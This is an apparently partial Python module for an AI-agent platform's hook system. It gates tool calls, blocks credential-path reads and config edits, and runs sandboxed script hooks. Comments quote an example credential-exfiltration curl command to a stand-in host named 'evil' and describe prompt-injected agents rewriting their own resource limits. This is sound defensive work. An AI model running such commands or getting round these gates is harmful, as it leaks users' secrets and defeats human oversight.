"""Config-driven hook system for KiroCrew's message pipeline.

Hooks intercept messages and tool calls based on rules in config.json.
Supports declarative rules and executable script hooks with timeout/sandboxing.
"""

from __future__ import annotations

import asyncio
import fnmatch
import json
import logging
import time
import uuid
from dataclasses import asdict, dataclass, field
from pathlib import Path

from kiro_crew import platform_compat
from kiro_crew.platform import current_context
from kiro_crew.security import (
    audit_bash_exfiltration,
    is_sensitive_bash_command,
    is_sensitive_path,
    is_sensitive_write_path,
)

logger = logging.getLogger(__name__)


# ── Hook Results ──

# Message hook action constants (backward compat — prefer direct string comparison)
HOOK_PASSTHROUGH = "passthrough"
HOOK_REPLY = "reply"
HOOK_MODIFY = "modify"
HOOK_INJECT_CONTEXT = "inject_context"

# Tool hook action constants
TOOL_ALLOW = "allow"
TOOL_AUTO_APPROVE = "auto_approve"
TOOL_DENY = "deny"

# Script hook events (aligned with Kiro CLI)
HOOK_EVENT_AGENT_SPAWN = "AgentSpawn"
HOOK_EVENT_USER_PROMPT_SUBMIT = "UserPromptSubmit"
HOOK_EVENT_PRE_TOOL_USE = "PreToolUse"
HOOK_EVENT_POST_TOOL_USE = "PostToolUse"
HOOK_EVENT_STOP = "Stop"

HOOK_EVENTS = (
    HOOK_EVENT_AGENT_SPAWN,
    HOOK_EVENT_USER_PROMPT_SUBMIT,
    HOOK_EVENT_PRE_TOOL_USE,
    HOOK_EVENT_POST_TOOL_USE,
    HOOK_EVENT_STOP,
)


@dataclass
class HookResult:
    """Result of running message hooks."""

    action: str  # HOOK_PASSTHROUGH, HOOK_REPLY, HOOK_MODIFY, HOOK_INJECT_CONTEXT
    text: str = ""

    @staticmethod
    def passthrough() -> HookResult:
        return HookResult(action=HOOK_PASSTHROUGH)

    @staticmethod
    def reply(text: str) -> HookResult:
        return HookResult(action=HOOK_REPLY, text=text)

    @staticmethod
    def modify(text: str) -> HookResult:
        return HookResult(action=HOOK_MODIFY, text=text)

    @staticmethod
    def inject_context(text: str) -> HookResult:
        return HookResult(action=HOOK_INJECT_CONTEXT, text=text)


@dataclass
class ToolHookResult:
    action: str  # TOOL_ALLOW, TOOL_AUTO_APPROVE, TOOL_DENY
    reason: str = ""

    @staticmethod
    def allow() -> ToolHookResult:
        return ToolHookResult(action=TOOL_ALLOW)

    @staticmethod
    def auto_approve() -> ToolHookResult:
        return ToolHookResult(action=TOOL_AUTO_APPROVE)

    @staticmethod
    def deny(reason: str) -> ToolHookResult:
        return ToolHookResult(action=TOOL_DENY, reason=reason)


# ── Config Types ──


@dataclass
class ContextRule:
    """Inject context when any trigger keyword matches."""

    triggers: list[str] = field(default_factory=list)
    context: str = ""


@dataclass
class AutoReplyHook:
    """Auto-reply without LLM for pattern matches."""

    pattern: str = ""
    reply: str = ""
    exact: bool = False


@dataclass
class TransformHook:
    """Transform message before sending to LLM."""

    pattern: str = ""
    prefix: str = ""
    suffix: str = ""


_BUNDLED_AUTO_APPROVE_TOOLS: list[str] = [
    "kirocrew browse *",
    "*kirocrew browse *",
]


@dataclass
class HooksConfig:
    """Loaded from config.json ``hooks`` section."""

    auto_approve_tools: list[str] = field(default_factory=list)
    auto_approve_sources: list[str] = field(default_factory=list)
    auto_approve_subagent_spawn: bool = False
    auto_approve_subagent_tools: bool = False
    auto_deny_tools: list[str] = field(default_factory=list)
    auto_replies: list[AutoReplyHook] = field(default_factory=list)
    transforms: list[TransformHook] = field(default_factory=list)
    context_rules: list[ContextRule] = field(default_factory=list)

    @classmethod
    def from_dict(cls, data: dict) -> HooksConfig:
        """Parse hooks config from a dict (config.json ``hooks`` section)."""
        auto_replies = [
            AutoReplyHook(
                pattern=h.get("pattern", ""),
                reply=h.get("reply", ""),
                exact=h.get("exact", False),
            )
            for h in data.get("auto_replies", [])
        ]
        transforms = [
            TransformHook(
                pattern=h.get("pattern", ""),
                prefix=h.get("prefix", ""),
                suffix=h.get("suffix", ""),
            )
            for h in data.get("transforms", [])
        ]
        context_rules = [
            ContextRule(
                triggers=r.get("triggers", []),
                context=r.get("context", ""),
            )
            for r in data.get("context_rules", [])
        ]
        user_approve = data.get("auto_approve_tools", [])
        merged_approve = list(dict.fromkeys(_BUNDLED_AUTO_APPROVE_TOOLS + user_approve))
        return cls(
            auto_approve_tools=merged_approve,
            auto_approve_sources=data.get("auto_approve_sources", []),
            auto_approve_subagent_spawn=bool(data.get("auto_approve_subagent_spawn", False)),
            auto_approve_subagent_tools=bool(data.get("auto_approve_subagent_tools", False)),
            auto_deny_tools=data.get("auto_deny_tools", []),
            auto_replies=auto_replies,
            transforms=transforms,
            context_rules=context_rules,
        )


# ── HookManager ──


class HookManager:
    """Process messages and tool calls through config-driven rules."""

    def __init__(self, config: HooksConfig | None = None):
        self._config = config or HooksConfig()

    def reload(self, config: HooksConfig) -> None:
        """Hot-reload hooks config."""
        self._config = config

    @property
    def auto_approve_subagent_spawn(self) -> bool:
        return self._config.auto_approve_subagent_spawn

    @property
    def auto_approve_subagent_tools(self) -> bool:
        return self._config.auto_approve_subagent_tools

    # ── Message hooks ──

    def on_message(self, text: str) -> HookResult:
        """Run message hooks. Returns first match or passthrough."""
        lower = text.lower()

        # Auto-replies (first match wins)
        for ar_hook in self._config.auto_replies:
            if ar_hook.exact:
                if lower == ar_hook.pattern.lower():
                    return HookResult.reply(ar_hook.reply)
            else:
                if ar_hook.pattern.lower() in lower:
                    return HookResult.reply(ar_hook.reply)

        # Transforms (first match wins)
        for tf_hook in self._config.transforms:
            if tf_hook.pattern.lower() in lower:
                modified = text
                if tf_hook.prefix:
                    modified = f"{tf_hook.prefix}\n{modified}"
                if tf_hook.suffix:
                    modified = f"{modified}\n{tf_hook.suffix}"
                return HookResult.modify(modified)

        # Context injection (all matching rules)
        injected: list[str] = []
        for rule in self._config.context_rules:
            if any(t.lower() in lower for t in rule.triggers):
                injected.append(rule.context)
        if injected:
            return HookResult.inject_context("\n\n".join(injected))

        return HookResult.passthrough()

    # ── Tool hooks ──

    def on_tool_call(
        self,
        tool_name: str,
        *,
        session_key: str = "",
        agent: str = "",
        app: str = "",
        tool_kind: str = "",
        raw_params: dict | None = None,
    ) -> ToolHookResult:
        """Check if a tool should be auto-approved, denied, or handled normally.

        The optional keyword-only ``session_key`` / ``agent`` / ``app`` identify
        the calling surface so the governance ceiling ∩ active-profile can be
        resolved and a tool/MCP call denied even when the kiro agent config
        granted it (the governance headline behavior).  They default to ``""`` so
        every existing caller is unaffected; a caller that supplies identity opts
        into per-surface governance.

        ``tool_kind`` (the ACP semantic kind: ``read``/``edit``/``fetch``/…) and
        ``raw_params`` (the real tool arguments — ``path``/``url``) let the gate
        enforce the path/host scopes a display title cannot carry
        (``filesystem.write``, ``network.egress``).  Both default to empty, so a
        caller that does not thread them only loses those two arg-derived scopes,
        never the title-derived ones.
        """
        # Strip display prefixes (e.g. "Running: ls *" → "ls *") so config
        # patterns like "ls" or "rm *" match without the prefix.
        normalized = _normalize_tool_name(tool_name)

        # Sensitive path protection (always enforced, before all other checks).
        # kiro-cli adds "Reading "/"Running: " display prefixes; the
        # claude-agent-acp adapter does NOT (its file-read title is the bare
        # path, its Bash title the bare command). So the prefix only HINTS at
        # the tool kind — we must run BOTH checks on the normalized name
        # regardless of prefix, or credential reads slip through on the Claude
        # Code provider. is_sensitive_path resolves the title as a path: a real
        # file-read title ("~/.aws/credentials") matches, while a bash command
        # title ("cat ~/.aws/credentials") resolves to a non-sensitive path and
        # is instead caught by is_sensitive_bash_command below.
        if is_sensitive_path(normalized):
            return ToolHookResult.deny(f"Blocked: access to sensitive path: {normalized}")
        # The display title is backend-variable and may NOT carry the path (an
        # "Editing <file>" / generic "code" title does not). The real path lives
        # in raw_params['path'] for file read/edit tools — run the SAME always-on
        # keystone on it so an edit/write to ~/.ssh, ~/.aws, or the governance
        # trust-root files (security_policy.json / profiles) is blocked even when
        # the title hides it. This is the keystone the governance model leans on
        # (agent-cannot-rewrite-its-own-ceiling), so it must not be title-gated.
        if raw_params:
            real_path = raw_params.get("path") or raw_params.get("file_path")
            if isinstance(real_path, str) and real_path and is_sensitive_path(real_path):
                return ToolHookResult.deny(f"Blocked: access to sensitive path: {real_path}")
        # Config files are WRITE-protected (reads stay allowed): block the agent's
        # file-EDIT tool from modifying config.json / config.local.json so a
        # prompt-injected agent cannot rewrite its own resource ceilings
        # (concurrent subagents, turn budget, warm-pool size) to drive host
        # resource exhaustion — pentest: config-loader bound bypass,
        # recommendation to block agent tools from modifying config files. Gated
        # on the ACP ``edit`` kind (the fs_write/code tool) so a plain read of
        # config is unaffected — the dashboard file viewer, ``cat``, and knowledge
        # indexing legitimately read config.json. Defense in depth on top of the
        # loader's load-time clamp, which already neutralizes any inflated value.
        #
        # Empty/unknown ``tool_kind`` (the ACP kind field is spec-optional; some
        # backends omit it) is DELIBERATELY left to the clamp rather than mirrored
        # here. ``governance._scopes_for_call`` (platform/governance.py) infers
        # BOTH filesystem.read AND filesystem.write from a lone ``path`` when the
        # kind is empty, because it is a *policy intersection* where an ungoverned
        # scope permits. This gate is a HARD deny, so applying that same shape
        # inference would also block legitimate config READS that arrive without a
        # kind — regressing the read-allowance that is the whole point of the
        # write-only tier. The load-time clamp is the authoritative backstop for
        # the empty-kind edit vector (and for bash writes like ``tee``/``>``),
        # so intentionally not hard-denying empty-kind keeps the two write-gates
        # from drifting into a read regression.
        if tool_kind == _EDIT_TOOL_KIND and raw_params:
            wpath = raw_params.get("path") or raw_params.get("file_path")
            if isinstance(wpath, str) and wpath and is_sensitive_write_path(wpath):
                return ToolHookResult.deny(
                    f"Blocked: modification of write-protected config path: {wpath}"
                )
        # execute_bash (prefixed or bare) — check for reads of sensitive paths.
        reason = is_sensitive_bash_command(normalized)
        if reason:
            return ToolHookResult.deny(reason)
        # Data-exfiltration / reverse-shell command shapes (Talos 5682f92b). The
        # anti-exfil patterns previously lived only in the passive audit path
        # (scan_history / dashboard count) and were never enforced at invocation,
        # so a hijacked agent could `curl -d @~/.aws/credentials evil` or open a
        # reverse shell unblocked. Deny them at the gate.
        reason = audit_bash_exfiltration(normalized)
        if reason:
            return ToolHookResult.deny(reason)

        # Built-in security deny list (always enforced).  Route through the
        # active PlatformContext's PolicyAuthority so the Amazon companion's
        # ADD-only deny overlay (+ internal patterns) applies when loaded.  The
        # standalone Default authority uses an empty overlay, so this resolves
        # to ``security.is_denied(name, auto_deny_tools)`` exactly as before —
        # no recursion (PolicyAuthority.is_denied calls security.is_denied with
        # the overlay patterns appended; security.is_denied never calls back).
        ctx = current_context()
        authority = ctx.security
        deny = self._config.auto_deny_tools
        reason = authority.is_denied(normalized, deny) or authority.is_denied(tool_name, deny)
        if reason:
            return ToolHookResult.deny(reason)

        # Governance ceiling ∩ active profile (Level 1 ∩ Level 2).  Runs BEFORE
        # the auto-approve loop so a governance deny wins over a user
        # auto-approve and is never bypassed.  This is the layer that denies a
        # tool/MCP call even when the kiro agent config granted it: the title for
        # an MCP tool arrives as ``mcp__server__tool`` and is governed by name
        # here regardless of kiro's allowedTools.  No-op on a standalone host
        # with no policy and no bound profile (gate_decision permits), so today's
        # behavior is preserved unless governance is configured.
        gov_reason = _governance_denial(
            ctx, tool_name, session_key, agent, app, tool_kind, raw_params
        )
        if gov_reason:
            return ToolHookResult.deny(gov_reason)

        # Auto-approve — match against both the original title (preserves
        # "Running: "/"Reading " prefixes) and the normalized name (stripped)
        # so that "Running: *" and "TaskeiGetTask" patterns both work.
        for pattern in self._config.auto_approve_tools:
            if _tool_matches(pattern, tool_name) or _tool_matches(pattern, normalized):
                return ToolHookResult.auto_approve()

        return ToolHookResult.allow()


def _governance_denial(
    ctx: object,
    tool_name: str,
    session_key: str,
    agent: str,
    app: str,
    tool_kind: str = "",
    raw_params: dict | None = None,
) -> str | None:
    """Return a denial reason if governance forbids *tool_name*, else None.

    Resolves the active profile (Level 2) for the calling surface and intersects
    it with the boot-frozen ceiling (Level 1).  Fast no-op when the host has
    neither a policy ceiling nor any profiles, so an ungoverned standalone host
    pays only an attribute read.  Emits a governance audit record on a deny.

    Fail-closed discipline mirrors the CPP shims: a ``PlatformCompositionError``
    (a non-standalone host that could not compose) is re-raised, never swallowed;
    any other unexpected error degrades to "no governance opinion" (None) so a
    transient profile-load glitch cannot wedge every tool call — the always-on
    deny floor above already ran.
    """
    from kiro_crew.platform.context import PlatformCompositionError

    ceiling = getattr(ctx, "governance", None)
    try:
        from kiro_crew.platform.governance import gate_decision
        from kiro_crew.platform.governance_profiles import resolve_active_scope

        profile = resolve_active_scope(session_key, agent=agent, app=app)
        # Nothing to enforce: no ceiling and no bound/forced profile.
        if ceiling is None and profile is None:
            return None
        decision = gate_decision(
            ceiling, profile, tool_name, tool_kind=tool_kind, raw_params=raw_params
        )
        if not decision.permitted:
            _audit_governance(session_key, agent, tool_name, decision)
            return f"Blocked by governance policy: {decision.reason}"
        return None
    except PlatformCompositionError:
        raise
    except Exception:
        # Wrap the late import + audit so a broken/renamed/partially-installed
        # governance_profiles cannot raise ImportError out of this except-branch
        # and convert the intended soft fail-open into a hard fail-closed that
        # wedges every tool call (CR-284272012).
        try:
            from kiro_crew.platform.governance_profiles import audit_governance_degraded

            audit_governance_degraded("hooks.on_tool_call", session_key=session_key, app=app)
        except Exception:
            logger.debug("governance degrade audit unavailable", exc_info=True)
        return None


def _audit_governance(session_key: str, agent: str, tool_name: str, decision: object) -> None:
    """Best-effort SEL audit of a governance denial (records scope/rule/layer)."""
    try:
        from kiro_crew.sel import sel

        sel().log_governance_decision(
            session_key=session_key,
            agent=agent or "kirocrew",
            tool_name=tool_name,
            outcome="denied",
            rule=getattr(decision, "rule", ""),
            layer=getattr(decision, "layer", ""),
            reason=getattr(decision, "reason", ""),
        )
    except Exception:
        logger.debug("governance audit emit failed", exc_info=True)


# Display prefixes that kiro-cli ACP adds to tool titles
_TOOL_TITLE_PREFIXES = ("Running: ", "Reading ")

# ACP semantic tool kind for a file write/edit (fs_write / code). The kind that
# carries a real target path in ``raw_params['path']`` and maps to the
# ``filesystem.write`` scope. Used to gate the write-only config-file protection
# so reads are not affected.
_EDIT_TOOL_KIND = "edit"


def _normalize_tool_name(tool_name: str) -> str:
    """Strip display prefixes so hook patterns match the actual tool/command name."""
    for prefix in _TOOL_TITLE_PREFIXES:
        if tool_name.startswith(prefix):
            return tool_name[len(prefix) :]
    return tool_name


def _tool_matches(pattern: str, tool_name: str) -> bool:
    """Match a tool pattern against a tool name.

    Supports: exact, ``prefix*``, ``*suffix``, ``*contains*``, ``*`` (all).
    Case-insensitive.
    """
    if pattern == "*":
        return True
    return fnmatch.fnmatch(tool_name.lower(), pattern.lower())


def validate_file_path(raw: str) -> str | None:
    """Validate and canonicalize a file path for dashboard file I/O.

    Enforces: is_sensitive_path(), realpath canonicalization.
    Returns the canonical path or None if rejected.
    """
    import os

    if not raw:
        return None
    path = os.path.realpath(os.path.expanduser(raw))
    if is_sensitive_path(path):
        return None
    return path


def safe_read_file(path: str) -> str:
    """Read a file after enforcing ``is_sensitive_path``.

    Canonicalizes the path (following every symlink), re-checks the RESOLVED
    target against ``is_sensitive_path`` — so a symlink pointing into ``~/.aws``
    etc. is refused through the link — then opens the canonical path with
    ``O_NOFOLLOW`` as defense-in-depth against a TOCTOU swap of the final
    component into a symlink after the check (AWS-33 / AWS-62).  Opening the
    already-resolved canonical path never rejects a legitimate file (its final
    component is not a symlink by construction), so this only closes the race.

    Raises ``PermissionError`` if the path is sensitive or a symlink race is
    detected. Other read errors (missing file, permission denied) propagate
    unchanged so callers surface accurate messages.
    """
    import errno
    import os

    resolved = os.path.realpath(os.path.expanduser(path))
    if is_sensitive_path(resolved):
        raise PermissionError(f"Blocked: access to sensitive path: {resolved}")
    try:
        fd = os.open(resolved, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError as exc:
        # ELOOP on the canonical (symlink-free) path means a concurrent TOCTOU
        # swap of the final component into a symlink — refuse it. Any other
        # OSError (ENOENT, EACCES) is a normal read error; re-raise as-is.
        if exc.errno in (errno.ELOOP, getattr(errno, "EMLINK", -1)):
            raise PermissionError(
                f"Blocked: refusing to follow symlink at {resolved}"
            ) from exc
        raise
    with os.fdopen(fd, "r", encoding="utf-8") as fh:
        return fh.read()


MAX_FILE_BYTES = 50 * 1024 * 1024  # 50 MB safety cap


class FileTooLargeError(Exception):
    """Raised when a file exceeds MAX_FILE_BYTES."""


def safe_read_file_bytes(raw: str) -> bytes | None:
    """Read file bytes through centralized is_sensitive_path() enforcement.

    ``validate_file_path`` already canonicalizes via ``realpath`` (following
    symlinks) and rejects sensitive resolved targets, so a workspace symlink
    into ``~/.aws`` etc. is refused before any read.  The final open uses
    ``O_NOFOLLOW`` on the canonical path as defense-in-depth against a TOCTOU
    swap of the final component into a symlink after the check (AWS-33).

    Returns file content as bytes, or None if path is rejected or unreadable.
    """
    import os

    path = validate_file_path(raw)
    if path is None:
        return None

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    try:
        with os.fdopen(fd, "rb") as fh:
            data = fh.read(MAX_FILE_BYTES + 1)
        if len(data) > MAX_FILE_BYTES:
            raise FileTooLargeError(f"File exceeds {MAX_FILE_BYTES // (1024 * 1024)} MB safety cap")
        return data
    except OSError:
        return None


# ── Script Hooks ──


@dataclass
class ScriptHook:
    """Executable hook that runs a shell command on a trigger event.

    Aligned with Kiro CLI hook semantics:
    - Exit 0: success (stdout → context for AgentSpawn/UserPromptSubmit)
    - Exit 2: block tool (PreToolUse only, stderr → LLM)
    - Other: warning (stderr shown to user)
    """

    id: str = ""
    name: str = ""
    event: str = HOOK_EVENT_USER_PROMPT_SUBMIT
    matcher: str = ""  # tool matcher for PreToolUse/PostToolUse (empty = all tools)
    command: str = ""  # shell command to execute
    timeout: int = 30  # seconds (Kiro CLI default is 30s)
    enabled: bool = True
    last_run: float = 0.0
    last_status: str = ""  # "ok", "error", "timeout", "blocked"
    run_count: int = 0

    def to_dict(self) -> dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: dict) -> ScriptHook:
        # Support legacy "pattern" field as fallback for "matcher"
        matcher = data.get("matcher", data.get("pattern", ""))
        return cls(
            id=data.get("id", str(uuid.uuid4())[:8]),
            name=data.get("name", ""),
            event=data.get("event", HOOK_EVENT_USER_PROMPT_SUBMIT),
            matcher=matcher,
            command=data.get("command", ""),
            timeout=data.get("timeout", 30),
            enabled=data.get("enabled", True),
            last_run=data.get("last_run", 0.0),
            last_status=data.get("last_status", ""),
            run_count=data.get("run_count", 0),
        )


@dataclass
class ScriptHookResult:
    """Result of executing a script hook."""

    hook_id: str
    hook_name: str
    event: str
    stdout: str = ""
    stderr: str = ""
    exit_code: int = -1
    error: str = ""
    duration_ms: int = 0

    @property
    def blocked(self) -> bool:
        """PreToolUse exit code 2 = block tool."""
        return self.exit_code == 2

    @property
    def succeeded(self) -> bool:
        return self.exit_code == 0


def _script_hooks_capability_denied(session_key: str = "") -> str | None:
    """Return a denial reason if governance disables ``capabilities.script_hooks``.

    Script hooks run an operator/agent-authored shell command in a subprocess
    (``run_script_hook`` → ``/bin/sh -c``), an arbitrary code-execution surface.
    The ``capabilities.script_hooks`` gate (default OFF in the catalog) lets a
    policy/profile forbid firing them.  Best-effort beyond the always-on
    sandbox/redaction guards: a ``PlatformCompositionError`` propagates
    (fail-closed CPP); any other error degrades to "no opinion" (None) so a
    transient governance glitch cannot wedge every hook.
    """
    from kiro_crew.platform.context import PlatformCompositionError

    try:
        from kiro_crew.platform.governance_profiles import governance_permits

        # item="" → the CapabilityGate's ``enabled`` flag is what is queried.
        decision = governance_permits("capabilities.script_hooks", "", session_key=session_key)
        if not getattr(decision, "permitted", True):
            return getattr(decision, "reason", "script_hooks capability disabled")
        return None
    except PlatformCompositionError:
        raise
    except Exception:
        # Wrapped (see _governance_denial): a late-import failure must not turn the
        # soft fail-open into a hard fail that wedges every script hook.
        try:
            from kiro_crew.platform.governance_profiles import audit_governance_degraded

            audit_governance_degraded(
                "run_script_hook", session_key=session_key, scope="capabilities.script_hooks"
            )
        except Exception:
            logger.debug("governance degrade audit unavailable", exc_info=True)
        return None


async def run_script_hook(
    hook: ScriptHook, context: str = "", hook_event: dict | None = None
) -> ScriptHookResult:
    """Execute a script hook's command with timeout.

    Passes hook event as JSON via STDIN (Kiro CLI compatible).
    """
    import os

    start = time.monotonic()
    # Governance: the ``capabilities.script_hooks`` gate (default OFF) may forbid
    # running script hooks for the active surface. Checked before the subprocess
    # spawns. The session key is carried on the hook_event when a caller threads
    # it (parent_session_key); absent → policy-only resolution.
    sk = ""
    if hook_event:
        sk = str(hook_event.get("parent_session_key") or hook_event.get("session_key") or "")
    gov_denied = _script_hooks_capability_denied(sk)
    if gov_denied:
        hook.last_run = time.time()
        hook.last_status = "blocked"
        hook.run_count += 1
        try:
            from kiro_crew.sel import sel

            sel().log_governance_decision(
                session_key=sk,
                tool_name=f"run_script_hook:{hook.name or hook.id}",
                scope="capabilities.script_hooks",
                outcome="denied",
                reason=gov_denied,
            )
        except Exception:
            logger.debug("script_hook deny audit failed", exc_info=True)
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=f"Blocked by governance policy: {gov_denied}",
            exit_code=2,  # PreToolUse "block tool" convention
            duration_ms=int((time.monotonic() - start) * 1000),
        )
    # Build hook event JSON for STDIN
    if hook_event is None:
        hook_event = {"hook_event_name": hook.event, "cwd": os.getcwd()}
    stdin_data = json.dumps(hook_event).encode()

    try:
        # circular import: sandbox → registry → apps → hooks, so import at call time
        from kiro_crew.sandbox import cgroup_scope_argv, resource_limit_preexec, wrap_argv

        env = {**os.environ, "KIROCREW_HOOK_EVENT": hook.event, "KIROCREW_HOOK_CONTEXT": context}
        # Shell per platform: POSIX /bin/sh -c, Windows cmd /c (no /bin/sh there).
        if platform_compat.IS_WINDOWS:
            argv = ["cmd", "/c", hook.command]
        else:
            argv = ["/bin/sh", "-c", hook.command]
        wrapped_argv, cleanup_path = wrap_argv(argv)
        wrapped_argv = cgroup_scope_argv(wrapped_argv)  # cgroup DoS ceiling (Talos bdf0d7e5)
        # Process-group isolation for clean tree-kill on timeout. Pass both flags
        # explicitly (NOT **dict unpack — breaks mypy's Popen overload resolution
        # on the build fleet): start_new_session=True is a no-op on Windows,
        # creationflags resolves to 0 (no-op) on POSIX. The Windows flag makes the
        # tree taskkill /T-reapable; POSIX setsid -> killpg.
        proc = await asyncio.create_subprocess_exec(
            *wrapped_argv,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=env,
            start_new_session=platform_compat.IS_POSIX,
            creationflags=platform_compat.CREATE_NEW_PROCESS_GROUP,
            preexec_fn=resource_limit_preexec(),
        )
        try:
            stdout_b, stderr_b = await asyncio.wait_for(
                proc.communicate(input=stdin_data), timeout=hook.timeout
            )
        finally:
            if cleanup_path:
                try:
                    os.unlink(cleanup_path)
                except OSError:
                    pass
        elapsed = int((time.monotonic() - start) * 1000)
        exit_code = proc.returncode or 0
        hook.last_run = time.time()
        hook.last_status = "blocked" if exit_code == 2 else ("ok" if exit_code == 0 else "error")
        hook.run_count += 1
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            stdout=stdout_b.decode(errors="replace").strip(),
            stderr=stderr_b.decode(errors="replace").strip(),
            exit_code=exit_code,
            duration_ms=elapsed,
        )
    except asyncio.TimeoutError:
        # Kill the whole process tree (shell + grandchildren) to prevent orphans.
        # platform_compat: killpg on POSIX, taskkill /T on Windows (os.killpg /
        # signal.SIGKILL are POSIX-only and would AttributeError on win32).
        try:
            if proc.returncode is None:
                platform_compat.kill_process_tree(proc.pid, platform_compat.SIGKILL)
                await proc.communicate()
        except Exception:
            pass
        elapsed = int((time.monotonic() - start) * 1000)
        hook.last_run = time.time()
        hook.last_status = "timeout"
        hook.run_count += 1
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=f"Timed out after {hook.timeout}s",
            duration_ms=elapsed,
        )
    except Exception as exc:
        elapsed = int((time.monotonic() - start) * 1000)
        hook.last_run = time.time()
        hook.last_status = "error"
        hook.run_count += 1
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=str(exc),
            duration_ms=elapsed,
        )


# ── Script Hook Store (persistence) ──

_HOOKS_FILE = "hooks.json"


class ScriptHookStore:
    """Persist script hooks to ~/.kirocrew/hooks.json."""

    def __init__(self, config_dir: Path | None = None):
        from kiro_crew.config.loader import config_dir as _cfg_dir

        self._dir = config_dir or _cfg_dir()
        self._path = self._dir / _HOOKS_FILE
        self._hooks: dict[str, ScriptHook] = {}
        self._load()

    def _load(self) -> None:
        if not self._path.exists():
            return
        try:
            data = json.loads(self._path.read_text(encoding="utf-8"))
            for h in data.get("hooks", []):
                hook = ScriptHook.from_dict(h)
                self._hooks[hook.id] = hook
        except (json.JSONDecodeError, OSError) as exc:
            logger.warning("Failed to load hooks: %s", exc)

    def _save(self) -> None:
        self._dir.mkdir(parents=True, exist_ok=True)
        data = {"hooks": [h.to_dict() for h in self._hooks.values()]}
        self._path.write_text(json.dumps(data, indent=2), encoding="utf-8")

    def list_all(self) -> list[ScriptHook]:
        return list(self._hooks.values())

    def get(self, hook_id: str) -> ScriptHook | None:
        return self._hooks.get(hook_id)

    def create(self, data: dict) -> ScriptHook:
        hook = ScriptHook.from_dict(data)
        if not hook.id:
            hook.id = str(uuid.uuid4())[:8]
        self._hooks[hook.id] = hook
        self._save()
        return hook

    def update(self, hook_id: str, data: dict) -> ScriptHook | None:
        hook = self._hooks.get(hook_id)
        if not hook:
            return None
        if "event" in data and data["event"] not in HOOK_EVENTS:
            raise ValueError(f"invalid event: {data['event']}")
        if "timeout" in data:
            t = data["timeout"]
            if not isinstance(t, int) or not (1 <= t <= 300):
                raise ValueError("timeout must be an integer between 1 and 300")
        for k in ("name", "event", "matcher", "command", "timeout", "enabled"):
            if k in data:
                setattr(hook, k, data[k])
        self._save()
        return hook

    def delete(self, hook_id: str) -> bool:
        if hook_id in self._hooks:
            del self._hooks[hook_id]
            self._save()
            return True
        return False

    def toggle(self, hook_id: str) -> ScriptHook | None:
        hook = self._hooks.get(hook_id)
        if not hook:
            return None
        hook.enabled = not hook.enabled
        self._save()
        return hook

    async def fire(
        self,
        event: str,
        context: str = "",
        tool_name: str = "",
        tool_input: dict | None = None,
        tool_response: dict | None = None,
        subagent_id: str | None = None,
        parent_session_key: str | None = None,
        agent_role: str | None = None,
    ) -> list[ScriptHookResult]:
        """Fire all enabled hooks matching the given event. Returns results.

        For PreToolUse/PostToolUse, matcher filters by tool name.
        For AgentSpawn/UserPromptSubmit/Stop, all hooks for that event fire.

        Optional ``subagent_id``, ``parent_session_key``, and ``agent_role`` are
        emitted into the hook_event payload so hook scripts can attribute tool
        calls to the specific agent/session that fired them. Parent contexts
        (dashboard chat, generic LLM helpers) leave them as ``None``.
        """
        import os

        results = []
        # Build base hook event (Kiro CLI format)
        hook_event: dict = {"hook_event_name": event, "cwd": os.getcwd()}
        if event == HOOK_EVENT_USER_PROMPT_SUBMIT and context:
            hook_event["prompt"] = context
        if tool_name:
            hook_event["tool_name"] = tool_name
        if tool_input is not None:
            hook_event["tool_input"] = tool_input
        if tool_response is not None:
            hook_event["tool_response"] = tool_response
        if subagent_id:
            hook_event["subagent_id"] = subagent_id
        if parent_session_key:
            hook_event["parent_session_key"] = parent_session_key
        if agent_role:
            hook_event["agent_role"] = agent_role

        for hook in list(self._hooks.values()):
            if not hook.enabled or hook.event != event:
                continue
            # Matcher filtering: for tool hooks, match tool name; for others, match context
            if hook.matcher:
                if event in (HOOK_EVENT_PRE_TOOL_USE, HOOK_EVENT_POST_TOOL_USE):
                    if not _tool_matches(hook.matcher, tool_name):
                        continue
                elif context and not fnmatch.fnmatch(context.lower(), hook.matcher.lower()):
                    continue
            result = await run_script_hook(hook, context, hook_event)
            results.append(result)
            logger.info(
                "Hook %s (%s): %s in %dms (exit=%d)",
                hook.name,
                event,
                hook.last_status,
                result.duration_ms,
                result.exit_code,
            )
        hooks_snapshot = [h.to_dict() for h in self._hooks.values()]
        await asyncio.to_thread(self._save_snapshot, hooks_snapshot)
        return results

    def _save_snapshot(self, hooks_data: list[dict]) -> None:
        """Thread-safe save using pre-captured hook snapshot."""
        self._dir.mkdir(parents=True, exist_ok=True)
        data = {"hooks": hooks_data}
        self._path.write_text(json.dumps(data, indent=2), encoding="utf-8")


# -- Global script hook store accessor --
# Set by dashboard server.py / handlers.py when the store is initialized.
# Allows any module (task_executor, llm_helpers, subagent) to fire script hooks
# without needing a reference to DashboardState.

_global_script_hook_store: ScriptHookStore | None = None


def set_global_hook_store(store: ScriptHookStore) -> None:
    """Register the global script hook store."""
    global _global_script_hook_store
    _global_script_hook_store = store


def get_global_hook_store() -> ScriptHookStore | None:
    """Get the global script hook store, or None if not initialized."""
    return _global_script_hook_store


async def fire_tool_hooks(
    hook_store: ScriptHookStore | None,
    event_title: str,
    event_tool_input: str | None = None,
    subagent_id: str | None = None,
    parent_session_key: str | None = None,
    agent_role: str | None = None,
) -> None:
    """Fire PreToolUse hooks for an EVENT_TOOL_CALL event.

    PostToolUse is NOT fired here because EVENT_TOOL_CALL is a notification
    that the tool is starting - the tool hasn't completed yet. PostToolUse
    should be fired on EVENT_TOOL_RESULT when available.

    Note: For EVENT_TOOL_CALL, hooks are informational only. The tool is
    already running (auto-approved by kiro-cli), so hook results cannot
    block execution. Hook scripts can log, audit, or trigger side effects.

    Optional ``subagent_id``, ``parent_session_key``, and ``agent_role`` are
    forwarded to the underlying hook_store so hook scripts can attribute
